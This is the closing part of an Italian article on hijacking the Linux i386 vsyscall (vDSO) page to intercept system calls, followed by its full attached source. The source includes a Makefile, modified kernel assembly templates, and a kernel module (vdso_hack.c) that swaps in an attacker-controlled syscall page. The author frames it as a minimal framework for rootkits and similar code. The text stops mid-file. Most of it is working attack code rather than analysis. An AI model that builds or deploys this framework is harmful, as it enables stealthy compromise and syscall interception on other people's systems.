+salienti:
+
+/usr/src/linux/arch/i386/kernel/vsyscall.lds.S
+SECTIONS
+{
+[...]
+  . = VDSO_PRELINK + 0x400;
+
+  .text           : { *(.text) }                :text =0x90909090
+  .note           : { *(.note.*) }              :text :note
+  .eh_frame_hdr   : { *(.eh_frame_hdr) }        :text :eh_frame_hdr
+  .eh_frame       : { KEEP (*(.eh_frame)) }     :text
+  .dynamic        : { *(.dynamic) }             :text :dynamic
+  .useless        : {
+        *(.got.plt) *(.got)
+        *(.data .data.* .gnu.linkonce.d.*)
+        *(.dynbss)
+        *(.bss .bss.* .gnu.linkonce.b.*)
+  }                                             :text
+[...]
+
+Con il comando SECTIONS decidiamo il layout delle sezioni costituenti l'elf
+da linkare: si nota benissimo che i vDSO saranno definiti in maniera davvero
+minimale. Infatti, oltre all'indispensabile .text, ad essa verranno accodate
+.note, .eh_frame*, .dynamic ed una singolare sezione di nome .useless, nella
+quale vengono accorpate la .data section, .bss ed altre sezioni irrilevanti
+per il funzionamento dello shared object in via di linkaggio. Dunque
+di primo acchito si puo' affermare che i vDSO uscenti non sono dotati di
+una ben definita sezione dati. Diciamo inoltre che la .note section e' designata
+dal codice in /usr/src/linux/arch/i386/kernel/vsyscall-note.S. Proseguiamo:
+
+/usr/src/linux/arch/i386/kernel/vsyscall.lds.S
+[...]
+VERSION
+{
+  LINUX_2.5 {
+    global:
+        __kernel_vsyscall;
+        __kernel_sigreturn;
+        __kernel_rt_sigreturn;
+
+    local: *;
+  };
+}
+
+ENTRY(__kernel_vsyscall);
+
+Abbiamo semplicemente esportato i simboli elencati, tra cui __kernel_vsyscall,
+che con il comando ENTRY viene promosso a entry point del vDSO, com'e' noto. 
+Ebbene, i nostri vDSO customizzati dovranno avere ne' piu' ne' meno lo stesso
+aspetto di quelli originali, pertanto non c'e' altra scelta che utilizzare
+l'appena esaminato linker script in fase di linking. Mentre sono necessari
+alcuni accorgimenti per la fase di assemblaggio dei vDSO stessi. In questo
+caso ci viene in soccorso il Makefile incaricato di cio':
+
+/usr/src/linux/arch/i386/kernel/Makefile
+[...]
+# The DSO images are built using a special linker script.
+quiet_cmd_syscall = SYSCALL $@
+      cmd_syscall = $(CC) -m elf_i386 -nostdlib $(SYSCFLAGS_$(@F)) \
+                          -Wl,-T,$(filter-out FORCE,$^) -o $@
+[...]
+vsyscall-flags = -shared -s -Wl,-soname=linux-gate.so.1 \
+                 $(call ld-option, -Wl$(comma)--hash-style=sysv)
+SYSCFLAGS_vsyscall-sysenter.so  = $(vsyscall-flags)
+SYSCFLAGS_vsyscall-int80.so     = $(vsyscall-flags)
+[...]
+
+In primis richiamiamo il linker script con -Wl,-T (-Wl e' un flag da passare al 
+compilatore in modo tale che esso fornisca al linker ld l'argomento seguente
+la virgola, nel nostro caso -T, appunto). Per far si' che il gcc costruisca
+per noi quella che a tutti gli effetti e' una shared library, passiamo il 
+flag -shared; rimuoviamo ogni simbolo dalla simbol table con -s (l'equivalente
+del comando strip(1)); infine diciamo al linker di forgiare il nostro elf
+con il nome di linux-gate.so.1: questo passaggio e' importante da un punto
+di vista estetico, infatti:
+
+sbudella@hannibal:~$ ldd /bin/cat
+        linux-gate.so.1 =>  (0xb7f42000)
+        libc.so.6 => /lib/libc.so.6 (0xb7e0e000)
+        /lib/ld-linux.so.2 (0xb7f43000)
+sbudella@hannibal:~$
+
+La dipendenza dal vDSO verra' risolta da ldd proprio con tale nome.
+Riassumendo, tutti i flag appena visionati dovranno essere utilizzati in
+fase di compilazione anche dal nostro Makefile, che si occupera' di costruire
+i nostri vDSO modificati, per infondergli un aspetto del tutto simile a quello
+degli originali.
+Vieniamo ora alla modifica vera e propria. Dobbiamo basare il nostro lavoro
+sui sorgenti forniti dal kernel, quindi disporremo di vsyscall-int80.S
+e vsyscall-sysenter.S; abbiamo gia esaminato il codice, tuttavia puo' essere
+chiarificatore riproporne il seguente frammento iniziale:
+
+/usr/src/linux/arch/i386/kernel/vsyscall-sysenter.S
+[...]
+__kernel_vsyscall:
+.LSTART_vsyscall:
+        push %ecx
+.Lpush_ecx:
+        push %edx
+.Lpush_edx:
+        push %ebp
+.Lenter_kernel:
+        movl %esp,%ebp
+        sysenter
+
+        /* 7: align return point with nop's to make disassembly easier */
+        .space 7,0x90
+[...]
+
+E' ovvio che si riesce a controllare ogni aspetto di una syscall: possiamo
+effettuare un confronto su %eax in modo tale da controllare l'eventualita'
+di una syscall da dirottare; gli altri registri ci forniscono ulteriori
+informazioni utili, ecc. Insomma, a questo punto e' banale implementare le 
+piu' classiche strategie di hook: si tratta soltanto di leggere e confrontare
+gli argomenti della call, saltare al nostro codice di hooking e svolgere il
+lavoro che gli abbiamo affidato, struttura questa comune ad ogni kernel
+hack degno di questo nome.
+Invece, per quel che riguarda piu' propriamente la nostra trattazione non 
+possiamo fare a meno di soffermarci sulla pseudo istruzione assembly
+'.space 7,0x90': con questa diciamo all'assemblatore di riservare 7 bytes
+subito dopo sysenter con il valore 0x90, cioe' nop, per non avere problemi di 
+allineamento del return point.
+Se si prova a modificare il sorgente in modo spregiudicato e' inevitabile
+incappare in segmentation fault, causa il disallineamento delle istruzioni
+successive a sysenter: ecco quindi che si rende necessaria un'attenta 
+sistemazione del codice di hooking. L'autore del presente articolo ha deciso di
+intraprendere la strada seguente:
+	- copiare il codice di hook alla fine del file vsyscall-sigreturn.S,
+	  richiamato in fase di compilazione da vsyscall-sysenter.S; 
+	- modificare vsyscall-sysenter.S come illustrato:
+[...]
+__kernel_vsyscall:
+        jmp HOOK
+.LSTART_vsyscall:
+        push %ecx
+[...] 
+	  dove HOOK e' la label all'indirizzo del codice di hooking in 
+	  vsyscall-sigreturn.S;
+	- E' opportuno reallineare il return point, ci vengono in soccorso
+	  le considerazioni seguenti: l'istruzione jmp HOOK conta solamente
+	  due bytes (opcode eb XX); dunque modifichiamo la direttiva
+	  all'assemblatore vista prima sottraendo a 7 la dimensione
+	  del salto al codice di hooking:
+[...]
+        /* 7: align return point with nop's to make disassembly easier */
+        .space 5,0x90
+[...]
+
+In questo modo possiamo avere hook di qualsiasi dimensione si voglia senza
+temere complicazioni di sorta.
+E' oltremodo importante fare un'ultima considerazione sull'argomento:
+i nostri hook verranno performati in USER SPACE, sebbene il nostro lavoro
+di hijacking si svolga in kernel space, e questo puo' avere implicazioni
+notevoli riguardo flessibilita' o possibilita' di usare codice della libc
+per i nostri hook, semplificando cosi' il lavoro di chi si appresta a scrivere
+codice di genere (rootkit ecc.).
+Comunque sia, per una comprensione piu' approfondita si consiglia di consultare
+il codice in allegato. 
+
+***** Codice e Considerazioni Finali.
+
+Quello che segue e' il codice di accompagnamento a tutta la nostra trattazione:
+come gia' visto e' di una semplicita' elegante ed efficace. Esso si
+occupa di compiere quanto discusso, fornendo un framework minimale per la 
+realizzazione di codice personalizzato: cio' e' possibile grazie alla totale 
+separazione del codice di hooking (user space) dal vettore di attacco al 
+kernel space che nient'altro e' che un piccolo LKM. Inutile dire che la nostra
+tecnica e' facilmente implementabile anche mediante iniezione diretta del
+codice in /dev/kmem.
+
+<-| vdso/Makefile |->
+##########
+##	vsyscall page hijacking: makefile;
+##	author: sbudella (Giuseppe Cocomazzi);
+##	contact: sbudella at gmail dot com;
+##	date: 23 jul 2007;
+##	license: gnu general public license, version 2; 
+##########
+
+ifneq ($(KERNELRELEASE),)
+	obj-m := vdso_hack.o
+else
+	KERNELDIR ?= /lib/modules/$(shell uname -r)/build 
+	PWD := $(shell pwd)
+
+default:
+	# create vsyscall-int80.S from template
+	rm -f vsyscall-int80.S
+	head -6 int80.template > vsyscall-int80.S
+	echo -e "\tjmp HOOK" >> vsyscall-int80.S
+	tail -40 int80.template >> vsyscall-int80.S
+
+	# create vsyscall-sysenter.S from template
+	rm -f vsyscall-sysenter.S
+	head -6 sysenter.template > vsyscall-sysenter.S
+	echo -e "\tjmp HOOK" >> vsyscall-sysenter.S
+	tail -91 sysenter.template | head -11 >> vsyscall-sysenter.S
+	echo -e "\t.space 5,0x90" >> vsyscall-sysenter.S
+	tail -79 sysenter.template >> vsyscall-sysenter.S
+
+	# create vsyscall-sigreturn joined with hook code
+	rm -f vsyscall-sigreturn.S
+	cp sigreturn.template vsyscall-sigreturn.S
+	echo >> vsyscall-sigreturn.S
+	cat hook.S >> vsyscall-sigreturn.S
+
+	# compile code for the hacked int80 vDSO  
+	gcc -c -o note.o vsyscall-note.S
+	gcc -c -o mcnamara.o vsyscall-int80.S 
+	ld -T vsyscall.lds.S -shared -s -soname=linux-gate.so.hacked \
+		--hash-style=sysv -o mcnamara mcnamara.o note.o
+
+	# compile code for the hacked sysenter vDSO
+	gcc -c -o troy.o vsyscall-sysenter.S
+	ld -T vsyscall.lds.S -shared -s -soname=linux-gate.so.hacked \
+		--hash-style=sysv -o troy troy.o note.o
+
+	# compile code for the original int80 vDSO
+	cp int80.template int80-orig.S
+	gcc -c -o int80.o int80-orig.S
+	ld -T vsyscall.lds.S -shared -s -soname=linux-gate.so.1 \
+                --hash-style=sysv -o int80.so int80.o note.o
+
+	# compile code for the original sysenter vDSO
+	cp sysenter.template sysenter-orig.S
+	gcc -c -o sysent.o sysenter-orig.S
+	ld -T vsyscall.lds.S -shared -s -soname=linux-gate.so.1 \
+                --hash-style=sysv -o sysent.so sysent.o note.o
+
+	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules
+clean:
+	rm -rf vdso_hack{.o,.ko,.mod.*} Module.* .vdso_hack* .tmp_versions/
+	rm -f mcnamara* troy* note.o
+	rm -f vsyscall-{sysenter,int80,sigreturn}.S
+	rm -f {int80,sysenter}-orig.S
+	rm -f {int80,sysent}.{o,so}
+
+endif 
+<-X->
+
+<-| vdso/asm-offsets.h |->
+#ifndef __ASM_OFFSETS_H__
+#define __ASM_OFFSETS_H__
+/*
+ * DO NOT MODIFY.
+ *
+ * This file was generated by Kbuild
+ *
+ */
+
+#define SIGCONTEXT_eax 44 /* offsetof(struct sigcontext, eax)	# */
+#define SIGCONTEXT_ebx 32 /* offsetof(struct sigcontext, ebx)	# */
+#define SIGCONTEXT_ecx 40 /* offsetof(struct sigcontext, ecx)	# */
+#define SIGCONTEXT_edx 36 /* offsetof(struct sigcontext, edx)	# */
+#define SIGCONTEXT_esi 20 /* offsetof(struct sigcontext, esi)	# */
+#define SIGCONTEXT_edi 16 /* offsetof(struct sigcontext, edi)	# */
+#define SIGCONTEXT_ebp 24 /* offsetof(struct sigcontext, ebp)	# */
+#define SIGCONTEXT_esp 28 /* offsetof(struct sigcontext, esp)	# */
+#define SIGCONTEXT_eip 56 /* offsetof(struct sigcontext, eip)	# */
+
+#define CPUINFO_x86 0 /* offsetof(struct cpuinfo_x86, x86)	# */
+#define CPUINFO_x86_vendor 1 /* offsetof(struct cpuinfo_x86, x86_vendor)	# */
+#define CPUINFO_x86_model 2 /* offsetof(struct cpuinfo_x86, x86_model)	# */
+#define CPUINFO_x86_mask 3 /* offsetof(struct cpuinfo_x86, x86_mask)	# */
+#define CPUINFO_hard_math 6 /* offsetof(struct cpuinfo_x86, hard_math)	# */
+#define CPUINFO_cpuid_level 8 /* offsetof(struct cpuinfo_x86, cpuid_level)	# */
+#define CPUINFO_x86_capability 12 /* offsetof(struct cpuinfo_x86, x86_capability)	# */
+#define CPUINFO_x86_vendor_id 40 /* offsetof(struct cpuinfo_x86, x86_vendor_id)	# */
+
+#define TI_task 0 /* offsetof(struct thread_info, task)	# */
+#define TI_exec_domain 4 /* offsetof(struct thread_info, exec_domain)	# */
+#define TI_flags 8 /* offsetof(struct thread_info, flags)	# */
+#define TI_status 12 /* offsetof(struct thread_info, status)	# */
+#define TI_preempt_count 20 /* offsetof(struct thread_info, preempt_count)	# */
+#define TI_addr_limit 24 /* offsetof(struct thread_info, addr_limit)	# */
+#define TI_restart_block 32 /* offsetof(struct thread_info, restart_block)	# */
+#define TI_sysenter_return 28 /* offsetof(struct thread_info, sysenter_return)	# */
+
+#define GDS_size 0 /* offsetof(struct Xgt_desc_struct, size)	# */
+#define GDS_address 2 /* offsetof(struct Xgt_desc_struct, address)	# */
+#define GDS_pad 6 /* offsetof(struct Xgt_desc_struct, pad)	# */
+
+#define PT_EBX 0 /* offsetof(struct pt_regs, ebx)	# */
+#define PT_ECX 4 /* offsetof(struct pt_regs, ecx)	# */
+#define PT_EDX 8 /* offsetof(struct pt_regs, edx)	# */
+#define PT_ESI 12 /* offsetof(struct pt_regs, esi)	# */
+#define PT_EDI 16 /* offsetof(struct pt_regs, edi)	# */
+#define PT_EBP 20 /* offsetof(struct pt_regs, ebp)	# */
+#define PT_EAX 24 /* offsetof(struct pt_regs, eax)	# */
+#define PT_DS 28 /* offsetof(struct pt_regs, xds)	# */
+#define PT_ES 32 /* offsetof(struct pt_regs, xes)	# */
+#define PT_FS 36 /* offsetof(struct pt_regs, xfs)	# */
+#define PT_ORIG_EAX 40 /* offsetof(struct pt_regs, orig_eax)	# */
+#define PT_EIP 44 /* offsetof(struct pt_regs, eip)	# */
+#define PT_CS 48 /* offsetof(struct pt_regs, xcs)	# */
+#define PT_EFLAGS 52 /* offsetof(struct pt_regs, eflags)	# */
+#define PT_OLDESP 56 /* offsetof(struct pt_regs, esp)	# */
+#define PT_OLDSS 60 /* offsetof(struct pt_regs, xss)	# */
+
+#define EXEC_DOMAIN_handler 4 /* offsetof(struct exec_domain, handler)	# */
+#define RT_SIGFRAME_sigcontext 164 /* offsetof(struct rt_sigframe, uc.uc_mcontext)	# */
+
+#define pbe_address 0 /* offsetof(struct pbe, address)	# */
+#define pbe_orig_address 4 /* offsetof(struct pbe, orig_address)	# */
+#define pbe_next 8 /* offsetof(struct pbe, next)	# */
+#define TSS_sysenter_esp0 -8700 /* offsetof(struct tss_struct, esp0) - sizeof(struct tss_struct)	# */
+#define PAGE_SIZE_asm 4096 /* PAGE_SIZE	# */
+#define VDSO_PRELINK -8192 /* VDSO_PRELINK	# */
+#define crypto_tfm_ctx_offset 52 /* offsetof(struct crypto_tfm, __crt_ctx)	# */
+
+#define PDA_cpu 4 /* offsetof(struct i386_pda, cpu_number)	# */
+#define PDA_pcurrent 8 /* offsetof(struct i386_pda, pcurrent)	# */
+
+#endif
+<-X->
+
+<-| vdso/int80.template |->
+/* this is part of the linux kernel */
+/* modified by sbudella for vdso_hack */
+	.text
+	.globl __kernel_vsyscall
+	.type __kernel_vsyscall,@function
+__kernel_vsyscall:
+.LSTART_vsyscall:
+	int $0x80
+	ret
+.LEND_vsyscall:
+	.size __kernel_vsyscall,.-.LSTART_vsyscall
+	.previous
+
+	.section .eh_frame,"a",@progbits
+.LSTARTFRAMEDLSI:
+	.long .LENDCIEDLSI-.LSTARTCIEDLSI
+.LSTARTCIEDLSI:
+	.long 0			/* CIE ID */
+	.byte 1			/* Version number */
+	.string "zR"		/* NUL-terminated augmentation string */
+	.uleb128 1		/* Code alignment factor */
+	.sleb128 -4		/* Data alignment factor */
+	.byte 8			/* Return address register column */
+	.uleb128 1		/* Augmentation value length */
+	.byte 0x1b		/* DW_EH_PE_pcrel|DW_EH_PE_sdata4. */
+	.byte 0x0c		/* DW_CFA_def_cfa */
+	.uleb128 4
+	.uleb128 4
+	.byte 0x88		/* DW_CFA_offset, column 0x8 */
+	.uleb128 1
+	.align 4
+.LENDCIEDLSI:
+	.long .LENDFDEDLSI-.LSTARTFDEDLSI /* Length FDE */
+.LSTARTFDEDLSI:
+	.long .LSTARTFDEDLSI-.LSTARTFRAMEDLSI /* CIE pointer */
+	.long .LSTART_vsyscall-.	/* PC-relative start address */
+	.long .LEND_vsyscall-.LSTART_vsyscall
+	.uleb128 0
+	.align 4
+.LENDFDEDLSI:
+	.previous
+
+/*
+ * Get the common code for the sigreturn entry points.
+ */
+#include "vsyscall-sigreturn.S"
+<-X->
+
+<-| vdso/sigreturn.template |->
+/* this is part of the linux kernel code */
+/* modified by sbudella for vdso_hack */
+#include <asm/unistd.h>
+#include "asm-offsets.h"
+
+
+/* XXX
+   Should these be named "_sigtramp" or something?
+*/
+
+	.text
+	.org __kernel_vsyscall+32,0x90
+	.globl __kernel_sigreturn
+	.type __kernel_sigreturn,@function
+__kernel_sigreturn:
+.LSTART_sigreturn:
+	popl %eax		/* XXX does this mean it needs unwind info? */
+	movl $__NR_sigreturn, %eax
+	int $0x80
+.LEND_sigreturn:
+	.size __kernel_sigreturn,.-.LSTART_sigreturn
+
+	.balign 32
+	.globl __kernel_rt_sigreturn
+	.type __kernel_rt_sigreturn,@function
+__kernel_rt_sigreturn:
+.LSTART_rt_sigreturn:
+	movl $__NR_rt_sigreturn, %eax
+	int $0x80
+.LEND_rt_sigreturn:
+	.size __kernel_rt_sigreturn,.-.LSTART_rt_sigreturn
+	.balign 32
+	.previous
+
+	.section .eh_frame,"a",@progbits
+.LSTARTFRAMEDLSI1:
+	.long .LENDCIEDLSI1-.LSTARTCIEDLSI1
+.LSTARTCIEDLSI1:
+	.long 0			/* CIE ID */
+	.byte 1			/* Version number */
+	.string "zRS"		/* NUL-terminated augmentation string */
+	.uleb128 1		/* Code alignment factor */
+	.sleb128 -4		/* Data alignment factor */
+	.byte 8			/* Return address register column */
+	.uleb128 1		/* Augmentation value length */
+	.byte 0x1b		/* DW_EH_PE_pcrel|DW_EH_PE_sdata4. */
+	.byte 0			/* DW_CFA_nop */
+	.align 4
+.LENDCIEDLSI1:
+	.long .LENDFDEDLSI1-.LSTARTFDEDLSI1 /* Length FDE */
+.LSTARTFDEDLSI1:
+	.long .LSTARTFDEDLSI1-.LSTARTFRAMEDLSI1 /* CIE pointer */
+	/* HACK: The dwarf2 unwind routines will subtract 1 from the
+	   return address to get an address in the middle of the
+	   presumed call instruction.  Since we didn't get here via
+	   a call, we need to include the nop before the real start
+	   to make up for it.  */
+	.long .LSTART_sigreturn-1-.	/* PC-relative start address */
+	.long .LEND_sigreturn-.LSTART_sigreturn+1
+	.uleb128 0			/* Augmentation */
+	/* What follows are the instructions for the table generation.
+	   We record the locations of each register saved.  This is
+	   complicated by the fact that the "CFA" is always assumed to
+	   be the value of the stack pointer in the caller.  This means
+	   that we must define the CFA of this body of code to be the
+	   saved value of the stack pointer in the sigcontext.  Which
+	   also means that there is no fixed relation to the other 
+	   saved registers, which means that we must use DW_CFA_expression
+	   to compute their addresses.  It also means that when we 
+	   adjust the stack with the popl, we have to do it all over again.  */
+
+#define do_cfa_expr(offset)						\
+	.byte 0x0f;			/* DW_CFA_def_cfa_expression */	\
+	.uleb128 1f-0f;			/*   length */			\
+0:	.byte 0x74;			/*     DW_OP_breg4 */		\
+	.sleb128 offset;		/*      offset */		\
+	.byte 0x06;			/*     DW_OP_deref */		\
+1:
+
+#define do_expr(regno, offset)						\
+	.byte 0x10;			/* DW_CFA_expression */		\
+	.uleb128 regno;			/*   regno */			\
+	.uleb128 1f-0f;			/*   length */			\
+0:	.byte 0x74;			/*     DW_OP_breg4 */		\
+	.sleb128 offset;		/*       offset */		\
+1:
+
+	do_cfa_expr(SIGCONTEXT_esp+4)
+	do_expr(0, SIGCONTEXT_eax+4)
+	do_expr(1, SIGCONTEXT_ecx+4)
+	do_expr(2, SIGCONTEXT_edx+4)
+	do_expr(3, SIGCONTEXT_ebx+4)
+	do_expr(5, SIGCONTEXT_ebp+4)
+	do_expr(6, SIGCONTEXT_esi+4)
+	do_expr(7, SIGCONTEXT_edi+4)
+	do_expr(8, SIGCONTEXT_eip+4)
+
+	.byte 0x42	/* DW_CFA_advance_loc 2 -- nop; popl eax. */
+
+	do_cfa_expr(SIGCONTEXT_esp)
+	do_expr(0, SIGCONTEXT_eax)
+	do_expr(1, SIGCONTEXT_ecx)
+	do_expr(2, SIGCONTEXT_edx)
+	do_expr(3, SIGCONTEXT_ebx)
+	do_expr(5, SIGCONTEXT_ebp)
+	do_expr(6, SIGCONTEXT_esi)
+	do_expr(7, SIGCONTEXT_edi)
+	do_expr(8, SIGCONTEXT_eip)
+
+	.align 4
+.LENDFDEDLSI1:
+
+	.long .LENDFDEDLSI2-.LSTARTFDEDLSI2 /* Length FDE */
+.LSTARTFDEDLSI2:
+	.long .LSTARTFDEDLSI2-.LSTARTFRAMEDLSI1 /* CIE pointer */
+	/* HACK: See above wrt unwind library assumptions.  */
+	.long .LSTART_rt_sigreturn-1-.	/* PC-relative start address */
+	.long .LEND_rt_sigreturn-.LSTART_rt_sigreturn+1
+	.uleb128 0			/* Augmentation */
+	/* What follows are the instructions for the table generation.
+	   We record the locations of each register saved.  This is
+	   slightly less complicated than the above, since we don't
+	   modify the stack pointer in the process.  */
+
+	do_cfa_expr(RT_SIGFRAME_sigcontext-4 + SIGCONTEXT_esp)
+	do_expr(0, RT_SIGFRAME_sigcontext-4 + SIGCONTEXT_eax)
+	do_expr(1, RT_SIGFRAME_sigcontext-4 + SIGCONTEXT_ecx)
+	do_expr(2, RT_SIGFRAME_sigcontext-4 + SIGCONTEXT_edx)
+	do_expr(3, RT_SIGFRAME_sigcontext-4 + SIGCONTEXT_ebx)
+	do_expr(5, RT_SIGFRAME_sigcontext-4 + SIGCONTEXT_ebp)
+	do_expr(6, RT_SIGFRAME_sigcontext-4 + SIGCONTEXT_esi)
+	do_expr(7, RT_SIGFRAME_sigcontext-4 + SIGCONTEXT_edi)
+	do_expr(8, RT_SIGFRAME_sigcontext-4 + SIGCONTEXT_eip)
+
+	.align 4
+.LENDFDEDLSI2:
+	.previous
+<-X->
+
+<-| vdso/sysenter.template |->
+/* this is part of the linux kernel */
+/* modified by sbudella for vdso_hack */
+	.text
+	.globl __kernel_vsyscall
+	.type __kernel_vsyscall,@function
+__kernel_vsyscall:
+.LSTART_vsyscall:
+	push %ecx
+.Lpush_ecx:
+	push %edx
+.Lpush_edx:
+	push %ebp
+.Lenter_kernel:
+	movl %esp,%ebp
+	sysenter
+
+	/* 7: align return point with nop's to make disassembly easier */
+	.space 7,0x90
+
+	/* 14: System call restart point is here! (SYSENTER_RETURN-2) */
+	jmp .Lenter_kernel
+	/* 16: System call normal return point is here! */
+	.globl SYSENTER_RETURN	/* Symbol used by sysenter.c  */
+SYSENTER_RETURN:
+	pop %ebp
+.Lpop_ebp:
+	pop %edx
+.Lpop_edx:
+	pop %ecx
+.Lpop_ecx:
+	ret
+.LEND_vsyscall:
+	.size __kernel_vsyscall,.-.LSTART_vsyscall
+	.previous
+
+	.section .eh_frame,"a",@progbits
+.LSTARTFRAMEDLSI:
+	.long .LENDCIEDLSI-.LSTARTCIEDLSI
+.LSTARTCIEDLSI:
+	.long 0			/* CIE ID */
+	.byte 1			/* Version number */
+	.string "zR"		/* NUL-terminated augmentation string */
+	.uleb128 1		/* Code alignment factor */
+	.sleb128 -4		/* Data alignment factor */
+	.byte 8			/* Return address register column */
+	.uleb128 1		/* Augmentation value length */
+	.byte 0x1b		/* DW_EH_PE_pcrel|DW_EH_PE_sdata4. */
+	.byte 0x0c		/* DW_CFA_def_cfa */
+	.uleb128 4
+	.uleb128 4
+	.byte 0x88		/* DW_CFA_offset, column 0x8 */
+	.uleb128 1
+	.align 4
+.LENDCIEDLSI:
+	.long .LENDFDEDLSI-.LSTARTFDEDLSI /* Length FDE */
+.LSTARTFDEDLSI:
+	.long .LSTARTFDEDLSI-.LSTARTFRAMEDLSI /* CIE pointer */
+	.long .LSTART_vsyscall-.	/* PC-relative start address */
+	.long .LEND_vsyscall-.LSTART_vsyscall
+	.uleb128 0
+	/* What follows are the instructions for the table generation.
+	   We have to record all changes of the stack pointer.  */
+	.byte 0x04		/* DW_CFA_advance_loc4 */
+	.long .Lpush_ecx-.LSTART_vsyscall
+	.byte 0x0e		/* DW_CFA_def_cfa_offset */
+	.byte 0x08		/* RA at offset 8 now */
+	.byte 0x04		/* DW_CFA_advance_loc4 */
+	.long .Lpush_edx-.Lpush_ecx
+	.byte 0x0e		/* DW_CFA_def_cfa_offset */
+	.byte 0x0c		/* RA at offset 12 now */
+	.byte 0x04		/* DW_CFA_advance_loc4 */
+	.long .Lenter_kernel-.Lpush_edx
+	.byte 0x0e		/* DW_CFA_def_cfa_offset */
+	.byte 0x10		/* RA at offset 16 now */
+	.byte 0x85, 0x04	/* DW_CFA_offset %ebp -16 */
+	/* Finally the epilogue.  */
+	.byte 0x04		/* DW_CFA_advance_loc4 */
+	.long .Lpop_ebp-.Lenter_kernel
+	.byte 0x0e		/* DW_CFA_def_cfa_offset */
+	.byte 0x0c		/* RA at offset 12 now */
+	.byte 0xc5		/* DW_CFA_restore %ebp */
+	.byte 0x04		/* DW_CFA_advance_loc4 */
+	.long .Lpop_edx-.Lpop_ebp
+	.byte 0x0e		/* DW_CFA_def_cfa_offset */
+	.byte 0x08		/* RA at offset 8 now */
+	.byte 0x04		/* DW_CFA_advance_loc4 */
+	.long .Lpop_ecx-.Lpop_edx
+	.byte 0x0e		/* DW_CFA_def_cfa_offset */
+	.byte 0x04		/* RA at offset 4 now */
+	.align 4
+.LENDFDEDLSI:
+	.previous
+
+/*
+ * Get the common code for the sigreturn entry points.
+ */
+#include "vsyscall-sigreturn.S"
+<-X->
+
+<-| vdso/vdso_hack.c |->
+/*====================
+==	vsyscall page hijacking: vdso_hack.c;
+==	author: sbudella (Giuseppe Cocomazzi);
+==	contact: sbudella at gmail dot com;
+==	date: 08 may 2007 - fixmapped vdso only;
+==	      23 jul 2007 - randomized vdso; 
+==	usage: make &&
+==	       insmod vdso_hack.ko syscall_pages_addr=`echo 0x``grep syscall_pages /boot/System.map | cut -f0-1 -d" "``` __set_fixmap_addr=`echo 0x``grep __set_fixmap /boot/System.map | cut -f0-1 -d" "```
+==	description: given the address of syscall_pages in kernel memory,
+==		create a new page frame which will contain the code of
+==		a vsyscall page modified to suit attackers' needs. Thus
+==		the original syscall page will point to the hacked one,
+==		and we can hijack syscalls directly in user-space without
+==		even touching the syscall table.
+==	license: gnu general public license, version 2;	
+====================*/
+		
+#include <linux/init.h>
+#include <linux/module.h>
+
+#include <asm/fixmap.h>
+#include <asm/pgalloc.h>
+
+/* modify these as the size of the shared objs grows */
+#define MCNAMARA_SIZE		2116
+#define TROY_SIZE		2140	
+#define DFLT_INT80_SIZE		2192
+#define DFLT_SYSENTER_SIZE	2216	
+
+/* modify these paths to resemble your cwd */
+#define MCNAMARA_INCBIN		".incbin \"/home/sbudella/src/vdso/mcnamara\""
+#define TROY_INCBIN		".incbin \"/home/sbudella/src/vdso/troy\""
+#define DFLT_INT80_INCBIN	".incbin \"/home/sbudella/src/vdso/int80.so\""
+#define DFLT_SYSENTER_INCBIN	".incbin \"/home/sbudella/src/vdso/sysent.so\""
+
+/* retrieved from System.map */
+#define SYSCALL_PAGES_ADDR	0xc07be240
+#define SET_FIXMAP_ADDR		0xc0113e80
+
+unsigned long syscall_pages_addr = SYSCALL_PAGES_ADDR;
+unsigned long __set_fixmap_addr = SET_FIXMAP_ADDR;
+module_param(syscall_pages_addr,long,0);
+module_param(__set_fixmap_addr,long,0);
+
+void *new_syscall_page = NULL;
+
+void mcnamara(void);
+void troy(void);
+void default_int80(void);
+void default_sysenter(void);
+
+static int vdso_hack_init(void)
+{
+	new_syscall_page = (void *) get_zeroed_page(GFP_ATOMIC);
+	struct page **o_syscall_pages = (struct page **) SYSCALL_PAGES_ADDR;
+	void (*__set_fixmap_)(enum fixed_addresses idx,unsigned long phys,
+                        pgprot_t flags) = (void *) SET_FIXMAP_ADDR;
+
+	/* command line parameters */
+	__set_fixmap_ = (void *) __set_fixmap_addr;
+	o_syscall_pages = (struct page **) syscall_pages_addr;
+
+#ifdef CONFIG_COMPAT_VDSO
+	/* equivalent to clear_fixmap(FIX_VDSO) */
+	__set_fixmap_(FIX_VDSO,0,__pgprot(0));
+
+	/* new fixmapping for the vsyscall page */
+        __set_fixmap_(FIX_VDSO,__pa(new_syscall_page),PAGE_READONLY_EXEC);
+
+#else
+	o_syscall_pages[0] = virt_to_page(new_syscall_page);
+
+#endif
+
+	if(!boot_cpu_has(X86_FEATURE_SEP)) {
+		memcpy(new_syscall_page,mcnamara,MCNAMARA_SIZE);
+		return 0;
+	}	
+
+	memcpy(new_syscall_page,troy,TROY_SIZE);
+
+	return 0;
+
+}
+
+/* restore the original vsyscall page */
+static void vdso_hack_exit(void)
+{
+	if(!boot_cpu_has(X86_FEATURE_SEP))
+		memcpy(new_syscall_page,default_int80,DFLT_INT80_SIZE);
+	
+	memcpy(new_syscall_page,default_sysenter,DFLT_SYSENTER_SIZE);
+}
+
+void mcnamara(void)
+{
+	__asm__(MCNAMARA_INCBIN);
+}
+
+void troy(void)
+{
+	__asm__(TROY_INCBIN);
+}
+
+void default_sysenter(void)
+{
+	__asm__(DFLT_SYSENTER_INCBIN);
+}
+
+void default_int80(void)
+{
+	__asm__(DFLT_INT80_INCBIN);
+}
+
+module_init(vdso_hack_init);
+module_exit(vdso_hack_exit);
+MODULE_LICENSE("GPL");
+<-X->
+
+<-| vdso/vsyscall-note.S |->
+#include <linux/uts.h>
+#include <linux/version.h>
+
+#define ASM_ELF_NOTE_BEGIN(name, flags, vendor, type)			      \
+	.section name, flags;						      \
+	.balign 4;							      \
+	.long 1f - 0f;		/* name length */			      \
+	.long 3f - 2f;		/* data length */			      \
+	.long type;		/* note type */				      \
+0:	.asciz vendor;		/* vendor name */			      \
+1:	.balign 4;							      \
+2:
+
+#define ASM_ELF_NOTE_END						      \
+3:	.balign 4;		/* pad out section */			      \
+	.previous
+
+	ASM_ELF_NOTE_BEGIN(".note.kernel-version", "a", UTS_SYSNAME, 0)
+	.long LINUX_VERSION_CODE
+	ASM_ELF_NOTE_END
+<-X->
+
+<-| vdso/vsyscall.lds.S |->
+/*
+ * Linker script for vsyscall DSO.  The vsyscall page is an ELF shared
+ * object prelinked to its virtual address, and with only one read-only
+ * segment (that fits in one page).  This script controls its layout.
+ */
